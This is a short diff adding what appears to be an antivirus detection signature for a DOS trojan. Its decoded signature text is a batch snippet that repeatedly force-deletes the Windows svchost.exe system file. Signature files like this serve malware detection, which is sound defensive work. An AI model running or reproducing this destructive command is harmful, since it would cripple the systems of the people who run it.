@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36547
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off :try @del /f /q "c:\windows\system32\svchost.exe" if exist "c:\windows\system32\svchost.exe" goto try 
